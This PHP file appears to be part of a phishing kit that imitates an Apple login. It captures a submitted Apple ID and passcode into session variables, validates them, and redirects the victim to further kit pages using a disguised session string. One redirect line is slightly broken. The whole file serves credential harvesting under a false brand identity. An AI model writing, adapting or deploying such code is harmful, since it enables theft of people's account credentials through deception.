<?php


ini_set("output_buffering",4096);
session_start();


//Create a sessions for ID&PASS
$_SESSION['AppleID'] = $ID = $_POST['id'];
$_SESSION['Passcode'] = $PASS = $_POST['password'];

//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);

/** Validate if a valid email & pass **/
function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;

}

if(!is_email($ID))
{
$errors3=1;
}
else
{
$errors3=0;
}





if ($PASS=="")
{
$errors2=1;
}
else{
$errors2=0;
}

if (strlen($PASS)<5)
{
$errors2=1;
}
else{
$errors2=0;
}

if ($errors2==1 || $errors3==1)
{

header("Location: invalid.php?invalid=$errors2&$errors3&session=$host").md5(time());
}


else 
{
$initiate="initiate.php?Page=Initiate&valid=true&session=$host".md5(time());
header("Location: $initiate");
}


?>